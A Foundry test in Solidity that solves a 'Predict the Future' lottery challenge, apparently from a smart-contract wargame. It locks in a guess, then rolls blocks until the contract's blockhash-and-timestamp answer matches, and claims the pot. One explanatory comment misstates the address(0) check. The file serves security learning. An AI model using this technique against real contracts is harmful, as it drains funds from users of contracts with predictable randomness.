// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "../src/lotteries/PredictTheFuture.sol";
import "forge-std/console.sol";

// forge test --match-contract PredictTheFutureTest -vvvv
contract PredictTheFutureTest is Test {
    address player = address(100);

    function setUp() public {
        vm.deal(player, 5 ether);
    }

    function attackPredictTheFuture(
        uint8 guess,
        PredictTheFutureChallenge _predictTheFutureChallenge
    ) public payable returns (bool success) {
        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        ) % 10;
        if (answer == guess) {
            _predictTheFutureChallenge.settle();
            return true;
        } else {
            return false;
        }
    }

    function testPredictTheFutureHack() public {
        /****************
         * Factory setup *
         *************** */
        PredictTheFutureChallenge predictTheFuture = new PredictTheFutureChallenge{
                value: 1 ether
            }();
        vm.startPrank(player);
        uint256 initialPlayerBalance = player.balance;
        assertEq(initialPlayerBalance, 5 ether);
        /****************
         *    Attack     *
         *************** */
        /*
         * If we decompose this contract :
         * 1)  lockInGuess
         * require that the guesser is address(0) and msg.value == 1 ether
         * So we need to call this function as address(0) to be able to :
         * Become the guesser
         * Pass a guess
         *
         * 2) settle where we basically pass the answer.
         * We can see that on the right hand side there is a %10 so we can understand that there are actually 10 possible solution ( 0 - 9 )
         * as the answer depends on the block number, and block timestamp, we can start with any guess
         *
         *
         * The hack function will try to check if , with the current block && timestamp, our answer match
         * if yes it calls settle
         * if no we roll 1 block and try again
         *
         */
        uint8 guess = 0;
        vm.roll(10);
        predictTheFuture.lockInGuess{value: 1 ether}(guess);
        while (!attackPredictTheFuture(guess, predictTheFuture)) {
            vm.roll(block.number + 1);
        }

        uint256 finalPlayerBalance = player.balance;
        assertEq(finalPlayerBalance, 6 ether);
        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = predictTheFuture.isComplete();
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
